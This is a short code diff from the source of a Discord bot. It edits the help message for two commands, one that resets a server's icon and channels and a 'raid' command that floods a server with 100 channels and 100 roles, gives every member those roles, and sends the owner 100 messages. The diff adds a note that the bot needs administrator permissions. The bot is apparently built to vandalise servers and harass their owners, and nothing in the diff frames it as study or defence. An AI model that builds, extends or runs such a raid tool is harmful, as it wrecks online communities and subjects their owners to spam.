@@ -49,8 +49,8 @@ bot.on("message", async(message) => {
     if(cmd === "help") {
         message.channel.send(stripIndents`Avalible commands for __**${bot.user.tag}**__
         
-        **${prefix}reset** > Resets the server icon and channels
-        **${prefix}raid** > Makes 100 voice and text channels, makes 100 roles, gives everyone all the roles the bot makes, and, sends the server owner 100 messages`)
+        **${prefix}reset** > Resets the server icon and channels **\`BOT MUST HAVE ADMINISTRATOR PERMISSIONS\`**
+        **${prefix}raid** > Makes 100 voice and text channels, makes 100 roles, gives everyone all the roles the bot makes, and, sends the server owner 100 messages **\`BOT MUST HAVE ADMINISTRATOR PERMISSIONS\`**`)
     }
 
     if(cmd === "raid") {
